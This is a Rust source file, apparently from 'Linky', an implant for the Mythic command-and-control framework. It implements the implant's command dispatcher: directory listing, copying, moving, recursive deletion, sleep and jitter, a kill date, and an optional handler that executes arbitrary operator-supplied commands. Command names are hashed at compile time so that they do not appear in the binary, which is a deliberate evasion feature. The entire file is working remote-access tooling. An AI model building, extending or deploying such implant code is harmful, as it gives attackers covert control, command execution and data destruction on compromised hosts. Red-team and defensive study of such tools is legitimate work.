/// Cross-platform command dispatch for Linky implants.
///
/// Returns `Some(output)` if the command was handled here,
/// `None` if the caller's platform-specific code should handle it.
///
/// Note: "download" and "upload" are handled directly in run_c2_loop
/// because they require multi-step Mythic file transfer protocol.
pub fn dispatch_common(command: &str, parameters: &str) -> Option<crate::CommandOutput> {
    use crate::cmd_hash_runtime;
    // OPSEC: dispatch on compile-time hashes so command names never appear
    // as plaintext strings in the binary.
    let output = match cmd_hash_runtime(command) {
        crate::cmds::CD => {
            let path = crate::extract_param(parameters, "path");
            let target = if path.is_empty() {
                "~".to_string()
            } else {
                path
            };
            let target = crate::expand_tilde(&target);
            match std::env::set_current_dir(&target) {
                Ok(_) => std::env::current_dir()
                    .map(|p| format!("[+] {}", p.display()))
                    .unwrap_or_else(|_| "[+] done".into()),
                Err(e) => format!("[-] cd {}: {}", target, e),
            }
            .into()
        }
        crate::cmds::PWD => std::env::current_dir()
            .map(|p| p.display().to_string())
            .unwrap_or_else(|e| format!("[-] {}", e))
            .into(),
        crate::cmds::LS => {
            let path = crate::extract_param(parameters, "path");
            return Some(crate::list_dir_browser(if path.is_empty() {
                "."
            } else {
                &path
            }));
        }
        crate::cmds::PID => std::process::id().to_string().into(),
        crate::cmds::SLEEP => {
            let secs = crate::extract_param(parameters, "seconds");
            let jitter = crate::extract_param(parameters, "jitter");
            crate::handle_sleep_command(format!("{} {}", secs, jitter).trim()).into()
        }
        crate::cmds::KILLDATE => {
            crate::handle_killdate_command(&crate::extract_param(parameters, "date")).into()
        }
        crate::cmds::CP => copy_path(parameters).into(),
        crate::cmds::MV => move_path(parameters).into(),
        crate::cmds::RM => remove_path(parameters).into(),
        crate::cmds::MKDIR => make_dir(parameters).into(),
        crate::cmds::EXECUTE if cfg!(feature = "cmd-execute") => execute_cmd(parameters).into(),
        _ => return None,
    };
    Some(output)
}

fn copy_path(parameters: &str) -> String {
    let src = crate::expand_tilde(&crate::extract_param(parameters, "source"));
    let dst = crate::expand_tilde(&crate::extract_param(parameters, "destination"));
    if src.is_empty() || dst.is_empty() {
        return "[-] missing arguments: <source> <destination>".into();
    }
    let meta = match std::fs::metadata(&src) {
        Ok(m) => m,
        Err(e) => return format!("[-] {}: {}", src, e),
    };
    if meta.is_dir() {
        match copy_dir_recursive(&src, &dst) {
            Ok(n) => format!("[+] copied directory {} -> {} ({} files)", src, dst, n),
            Err(e) => format!("[-] {}", e),
        }
    } else {
        match std::fs::copy(&src, &dst) {
            Ok(bytes) => format!("[+] copied {} -> {} ({} bytes)", src, dst, bytes),
            Err(e) => format!("[-] {}", e),
        }
    }
}

fn copy_dir_recursive(src: &str, dst: &str) -> Result<usize, String> {
    use std::path::Path;
    std::fs::create_dir_all(dst).map_err(|e| format!("mkdir {}: {}", dst, e))?;
    let mut count = 0;
    for entry in std::fs::read_dir(src).map_err(|e| format!("read {}: {}", src, e))? {
        let entry = entry.map_err(|e| e.to_string())?;
        let src_path = entry.path();
        let dst_path = Path::new(dst).join(entry.file_name());
        if src_path.is_dir() {
            count += copy_dir_recursive(
                &src_path.display().to_string(),
                &dst_path.display().to_string(),
            )?;
        } else {
            std::fs::copy(&src_path, &dst_path).map_err(|e| e.to_string())?;
            count += 1;
        }
    }
    Ok(count)
}

fn move_path(parameters: &str) -> String {
    let src = crate::expand_tilde(&crate::extract_param(parameters, "source"));
    let dst = crate::expand_tilde(&crate::extract_param(parameters, "destination"));
    if src.is_empty() || dst.is_empty() {
        return "[-] missing arguments: <source> <destination>".into();
    }
    match std::fs::rename(&src, &dst) {
        Ok(_) => format!("[+] moved {} -> {}", src, dst),
        Err(e) => format!("[-] {}", e),
    }
}

fn remove_path(parameters: &str) -> String {
    let path = crate::expand_tilde(&crate::extract_param(parameters, "path"));
    if path.is_empty() {
        return "[-] missing argument: <path>".into();
    }
    let result = match std::fs::metadata(&path) {
        Ok(m) if m.is_dir() => std::fs::remove_dir_all(&path),
        _ => std::fs::remove_file(&path),
    };
    match result {
        Ok(_) => format!("[+] removed {}", path),
        Err(e) => format!("[-] {}: {}", path, e),
    }
}

fn make_dir(parameters: &str) -> String {
    let path = crate::expand_tilde(&crate::extract_param(parameters, "path"));
    if path.is_empty() {
        return "[-] missing argument: <path>".into();
    }
    match std::fs::create_dir_all(&path) {
        Ok(_) => format!("[+] created {}", path),
        Err(e) => format!("[-] {}: {}", path, e),
    }
}

fn execute_cmd(parameters: &str) -> String {
    let raw = crate::extract_param(parameters, "command");
    // Do NOT fall back to the raw JSON `parameters` when the "command" key is
    // absent — that would pass a JSON blob (e.g. '{"path":"/tmp"}') to
    // Command::new, which is never the intended behaviour.
    if raw.is_empty() {
        return "[-] missing argument: <binary> [args...]".into();
    }
    let parts: Vec<&str> = raw.split_whitespace().collect();
    if parts.is_empty() {
        return "[-] missing argument: <binary> [args...]".into();
    }
    match std::process::Command::new(parts[0])
        .args(&parts[1..])
        .output()
    {
        Ok(o) => {
            let stdout = String::from_utf8_lossy(&o.stdout);
            let stderr = String::from_utf8_lossy(&o.stderr);
            if stderr.is_empty() {
                stdout.to_string()
            } else {
                format!("{}{}", stdout, stderr)
            }
        }
        Err(e) => format!("[-] {}: {}", parts[0], e),
    }
}
